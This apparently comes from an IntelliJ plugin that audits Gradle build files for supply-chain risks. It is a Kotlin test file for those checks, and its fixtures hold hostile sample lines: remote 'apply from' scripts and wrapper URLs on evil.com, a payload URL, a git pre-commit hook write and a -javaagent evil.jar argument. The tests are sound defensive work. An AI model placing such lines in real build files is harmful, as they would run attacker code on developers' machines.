package com.mohammedalaamorsi.safegradle

import com.intellij.testFramework.fixtures.BasePlatformTestCase

class SecurityCheckTests : BasePlatformTestCase() {

    // ─── CredentialLeakCheck ───────────────────────────────────────────────

    fun `test credential leak detects hardcoded api key`() {
        val check = CredentialLeakCheck()
        val code = """api_key = "s3cr3tKeyABCDEF123456""""
        val file = myFixture.configureByText("gradle.properties", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test credential leak ignores placeholder values`() {
        val check = CredentialLeakCheck()
        val code = """api_key = "changeit""""
        val file = myFixture.configureByText("gradle.properties", code)
        val violations = check.check(file.virtualFile, code, project)
        assertEmpty(violations)
    }

    fun `test credential leak detects AWS key ID`() {
        val check = CredentialLeakCheck()
        val code = """val awsKey = "AKIAIOSFODNN7EXAMPLE" """
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test credential leak detects GitHub PAT`() {
        val check = CredentialLeakCheck()
        val code = """val token = "ghp_${("A".repeat(36))}" """
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
    }

    fun `test credential leak skips commented lines`() {
        val check = CredentialLeakCheck()
        val code = """// api_key = "realSecretXYZ123456""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── GradleWrapperIntegrityCheck ──────────────────────────────────────

    fun `test wrapper integrity flags unofficial distributionUrl`() {
        val check = GradleWrapperIntegrityCheck()
        val content = "distributionUrl=https\\://evil.com/gradle-8.0-bin.zip"
        val file = myFixture.configureByText("gradle-wrapper.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test wrapper integrity flags missing sha256`() {
        val check = GradleWrapperIntegrityCheck()
        val content = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.2.1-bin.zip"
        val file = myFixture.configureByText("gradle-wrapper.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.LOW })
    }

    fun `test wrapper integrity accepts official url`() {
        val check = GradleWrapperIntegrityCheck()
        val content = """
            distributionUrl=https\://services.gradle.org/distributions/gradle-9.2.1-bin.zip
            distributionSha256Sum=abc123def456abc123def456abc123def456abc123def456abc123def456abc1
        """.trimIndent()
        val file = myFixture.configureByText("gradle-wrapper.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertTrue(violations.none { it.riskLevel == RiskLevel.HIGH && it.message.contains("official") })
    }

    // ─── DependencyConfusionCheck ──────────────────────────────────────────

    fun `test dependency confusion flags typosquatted group`() {
        val check = DependencyConfusionCheck()
        val code = """implementation "com.gooogle:guava:31.0-jre""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test dependency confusion passes legitimate group`() {
        val check = DependencyConfusionCheck()
        val code = """implementation "com.google.guava:guava:31.0-jre""""
        val file = myFixture.configureByText("build.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── PluginInjectionCheck ─────────────────────────────────────────────

    fun `test plugin injection flags unknown plugin`() {
        val check = PluginInjectionCheck()
        val code = """id("com.suspicious.unknownplugin")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.LOW, violations[0].riskLevel)
    }

    fun `test plugin injection passes known safe plugin`() {
        val check = PluginInjectionCheck()
        val code = """id("com.android.application")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test plugin injection passes trusted prefix`() {
        val check = PluginInjectionCheck()
        val code = """id("org.jetbrains.kotlin.android") version "1.9.0""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── VulnerabilityCheck ───────────────────────────────────────────────

    fun `test vulnerability check flags known cve`() {
        val check = VulnerabilityCheck()
        val code = """implementation "org.apache.logging.log4j:log4j-core:2.14.1""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertTrue(violations[0].message.contains("CVE-2021-44228"))
    }

    fun `test vulnerability check passes safe version`() {
        val check = VulnerabilityCheck()
        val code = """implementation "org.apache.logging.log4j:log4j-core:2.17.0""""
        val file = myFixture.configureByText("build.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).none { it.message.contains("CVE") })
    }

    fun `test vulnerability check flags dynamic version`() {
        val check = VulnerabilityCheck()
        val code = """implementation "com.google.guava:guava:+""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test vulnerability check flags snapshot version`() {
        val check = VulnerabilityCheck()
        val code = """implementation "org.springframework:spring-core:6.0.0-SNAPSHOT""""
        val file = myFixture.configureByText("build.gradle", code)
        assertNotEmpty(check.check(file.virtualFile, code, project))
    }

    // ─── FileExfiltrationCheck ────────────────────────────────────────────

    fun `test file exfiltration detects FileOutputStream`() {
        val check = FileExfiltrationCheck()
        val code = """val out = FileOutputStream("/tmp/stolen.txt")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test file exfiltration detects Files.copy`() {
        val check = FileExfiltrationCheck()
        val code = """Files.copy(src, dst)"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertNotEmpty(check.check(file.virtualFile, code, project))
    }

    fun `test file exfiltration detects git hook write`() {
        val check = FileExfiltrationCheck()
        val code = """file(".git/hooks/pre-commit").writeText("evil")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.HIGH })
    }

    fun `test file exfiltration skips comments`() {
        val check = FileExfiltrationCheck()
        val code = """// FileOutputStream example"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── GitignoreExposureCheck ───────────────────────────────────────────

    fun `test gitignore exposure flags missing keystore`() {
        val check = GitignoreExposureCheck()
        val content = "build/\n.gradle/\n"
        val file = myFixture.configureByText(".gitignore", content)
        val violations = check.check(file.virtualFile, content, project)
        assertTrue(violations.any { it.message.contains("*.jks") || it.message.contains("*.keystore") })
    }

    fun `test gitignore exposure passes when keystore excluded`() {
        val check = GitignoreExposureCheck()
        val content = """
            build/
            .gradle/
            *.jks
            *.keystore
            *.p12
            *.pfx
            keystore.properties
            local.properties
            google-services.json
            GoogleService-Info.plist
            *.aab
            .env
            secrets.properties
            signing.properties
        """.trimIndent()
        val file = myFixture.configureByText(".gitignore", content)
        assertTrue(check.check(file.virtualFile, content, project).isEmpty())
    }

    // ─── NetworkActivityCheck ─────────────────────────────────────────────

    fun `test network activity detects non-whitelisted url`() {
        val check = NetworkActivityCheck()
        val code = """val url = java.net.URL("https://evil.example.com/payload")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertNotEmpty(check.check(file.virtualFile, code, project))
    }

    fun `test network activity skips whitelisted domain`() {
        val check = NetworkActivityCheck()
        val code = """maven { url = uri("https://repo.maven.apache.org/maven2") }"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test network activity detects http non-https url`() {
        val check = NetworkActivityCheck()
        val code = """maven { url = uri("http://evil.example.com/repo") }"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.HIGH })
    }

    fun `test network activity does not flag url in comment`() {
        val check = NetworkActivityCheck()
        val code = """// see https://evil.example.com for more info"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test network activity flags jcenter deprecated`() {
        val check = NetworkActivityCheck()
        val code = "jcenter()"
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertTrue(violations[0].message.contains("shut down"))
    }

    // ─── ApplyFromCheck ───────────────────────────────────────────────────

    fun `test apply from flags remote http url`() {
        val check = ApplyFromCheck()
        val code = """apply from: "https://evil.com/malicious.gradle""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test apply from ignores local file`() {
        val check = ApplyFromCheck()
        val code = """apply from: "scripts/signing.gradle""""
        val file = myFixture.configureByText("build.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── JvmArgsCheck ─────────────────────────────────────────────────────

    fun `test jvm args flags javaagent`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-Xmx4g -javaagent:/path/to/evil.jar"
        val file = myFixture.configureByText("gradle.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test jvm args flags add-opens`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-Xmx4g --add-opens java.base/java.lang=ALL-UNNAMED"
        val file = myFixture.configureByText("gradle.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test jvm args passes clean config`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-Xmx2g -XX:MaxMetaspaceSize=512m"
        val file = myFixture.configureByText("gradle.properties", content)
        assertTrue(check.check(file.virtualFile, content, project).isEmpty())
    }

    fun `test jvm args only applies to gradle properties`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-javaagent:/evil.jar"
        val file = myFixture.configureByText("build.gradle.kts", content)
        assertTrue(check.check(file.virtualFile, content, project).isEmpty())
    }
}
